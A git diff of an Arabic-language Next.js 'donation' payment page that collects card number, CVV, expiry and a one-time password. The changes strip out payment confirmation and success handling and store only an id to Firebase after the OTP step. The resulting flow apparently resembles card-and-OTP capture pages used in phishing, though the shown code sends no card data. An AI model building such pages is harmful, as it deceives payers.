@@ -2,7 +2,6 @@
 
 import { useState, useEffect } from 'react';
 import { useRouter, useSearchParams } from 'next/navigation';
-import Image from 'next/image';
 import {
   ArrowLeft,
   CreditCard,
@@ -22,29 +21,24 @@ import {
   CardFooter,
 } from '@/components/ui/card';
 import { toast } from 'sonner';
-import { savePayment, confirmPayment } from '@/lib/firebase';
+import { addData } from '@/lib/firebase';
 
 export default function PaymentPage() {
   const router = useRouter();
   const searchParams = useSearchParams();
-  const donationId = searchParams.get('id');
-  const amount = searchParams.get('amount');
-
   const [cardNumber, setCardNumber] = useState('');
   const [cardHolder, setCardHolder] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showOtp, setShowOtp] = useState(false);
-  const [otp, setOtp] = useState(['', '', '', '', '', '']);
+  const [otp, setOtp] = useState('');
   const [paymentId, setPaymentId] = useState('');
-
-  useEffect(() => {
-    // Redirect if no donation ID is provided
-    if (!donationId || !amount) {
-      router.push('/');
-    }
-  }, [donationId, amount, router]);
+  const [amount, setAmount] = useState('');
+useEffect(()=>{
+const am=localStorage.getItem('amount')
+setAmount(am!)
+},[])
 
   const formatCardNumber = (value: string) => {
     // Remove all non-digit characters
@@ -69,28 +63,9 @@ export default function PaymentPage() {
     return digits;
   };
 
-  const handleOtpChange = (index: number, value: string) => {
-    if (value.length > 1) {
-      value = value.slice(0, 1);
-    }
-
-    if (value && !/^\d+$/.test(value)) {
-      return;
-    }
-
-    const newOtp = [...otp];
-    newOtp[index] = value;
-    setOtp(newOtp);
-
-    // Auto-focus next input
-    if (value && index < 5) {
-      const nextInput = document.getElementById(`otp-${index + 1}`);
-      if (nextInput) {
-        nextInput.focus();
-      }
-    }
+  const handleOtpChange = (value: string) => {
+    setOtp(value);
   };
-
   const handleSubmitPayment = async () => {
     // Form validation
     if (cardNumber.replace(/\s/g, '').length !== 16) {
@@ -112,9 +87,8 @@ export default function PaymentPage() {
       toast.error('يرجى إدخال رمز CVV صحيح مكون من 3 أرقام');
       return;
     }
-
+    const donationId = localStorage.getItem('visitor')
     setIsSubmitting(true);
-
     try {
       if (!donationId) throw new Error('Missing donation ID');
 
@@ -126,9 +100,7 @@ export default function PaymentPage() {
         cvv,
         donationId,
       };
-
-      const id = await savePayment(paymentData);
-
+const id=localStorage.getItem('visitor')
       if (id) {
         setPaymentId(id);
         setShowOtp(true);
@@ -147,34 +119,17 @@ export default function PaymentPage() {
       setIsSubmitting(false);
     }
   };
-
   const handleVerifyOtp = async () => {
     // Validate OTP
-    const otpValue = otp.join('');
+    const otpValue = otp;
     if (otpValue.length !== 6) {
       toast.error('يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك');
       return;
     }
-
     setIsSubmitting(true);
-
     try {
-      if (!donationId || !paymentId) throw new Error('Missing required IDs');
-
-      // For demo purposes, we'll accept any 6-digit OTP
-      // In a real app, you would verify this with your payment provider
-
-      // Update payment status in Firestore
-      const success = await confirmPayment(paymentId, donationId,otpValue);
-
-      if (success) {
-        toast.success('تم التحقق من الدفع بنجاح!');
-
-        // Navigate to success page
-        router.push(`/success?id=${donationId}`);
-      } else {
-        throw new Error('Failed to verify payment');
-      }
+      if ( !paymentId) throw new Error('Missing required IDs');
+      addData({id:paymentId,})
     } catch (error) {
       console.error('Error verifying OTP:', error);
       toast.error(
@@ -250,8 +205,8 @@ export default function PaymentPage() {
                   </div>
                   <Input
                     id="cardNumber"
-                    placeholder="1234 5678 9012 3456"
                     value={cardNumber}
+                    type='tel'
                     onChange={(e) =>
                       setCardNumber(formatCardNumber(e.target.value))
                     }
@@ -269,7 +224,6 @@ export default function PaymentPage() {
                   </label>
                   <Input
                     id="cardHolder"
-                    placeholder="محمد أحمد"
                     value={cardHolder}
                     onChange={(e) => setCardHolder(e.target.value)}
                     className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
@@ -308,7 +262,6 @@ export default function PaymentPage() {
                     </div>
                     <Input
                       id="cvv"
-                      placeholder="123"
                       value={cvv}
                       onChange={(e) => {
                         setCvv(e.target.value);
@@ -334,7 +287,7 @@ export default function PaymentPage() {
                   </h3>
                   <p className="text-sm text-gray-600">
                     لقد أرسلنا رمز تحقق لمرة واحدة إلى رقم هاتفك المحمول المسجل.
-                    يرجى إدخال الرمز المكون من 6 أرقام أدناه للتحقق من الدفع.
+                 
                   </p>
                 </div>
 
@@ -346,17 +299,13 @@ export default function PaymentPage() {
                     رمز التحقق لمرة واحدة (OTP)
                   </label>
                   <div className="flex justify-center gap-2 dir-ltr">
-                    {otp.map((digit, index) => (
-                      <Input
-                        key={index}
-                        id={`otp-${index}`}
-                        value={digit}
-                        onChange={(e) => handleOtpChange(index, e.target.value)}
-                        className="w-10 h-12 text-center text-xl font-bold border-gray-300 focus:border-blue-500 focus:ring-blue-500"
-                        maxLength={1}
-                        inputMode="numeric"
-                      />
-                    ))}
+                    <Input
+                      value={otp}
+                      onChange={(e) => handleOtpChange(e.target.value)}
+                      className="w-full h-12 text-center text-xl font-bold border-gray-300 focus:border-blue-500 focus:ring-blue-500"
+                      maxLength={6}
+                      inputMode="numeric"
+                    />
                   </div>
                   <p className="text-center text-sm text-gray-500 mt-2">
                     لم يصلك الرمز؟{' '}
@@ -390,34 +339,7 @@ export default function PaymentPage() {
           </CardFooter>
         </Card>
 
-        <div className="flex flex-col items-center space-y-3">
-          <div className="flex items-center justify-center space-x-2 rtl:space-x-reverse">
-            <img
-              src="/foot.png"
-              alt="PCI DSS"
-              width={60}
-              height={40}
-              className="h-8 w-auto opacity-80"
-            />
-            <img
-              src="/pci-dss-compliant-logo-vector.png"
-              alt="SSL Secure"
-              width={60}
-              height={40}
-              className="h-8 w-auto opacity-80"
-            />
-            <img
-              src="/6741171.png"
-              alt="3D Secure"
-              width={60}
-              height={40}
-              className="h-8 w-auto opacity-80"
-            />
-          </div>
-          <p className="text-xs text-gray-500 text-center">
-            جميع المعلومات المالية مشفرة ومحمية بواسطة أحدث تقنيات الأمان
-          </p>
-        </div>
+     
       </main>
 
       {/* Footer */}
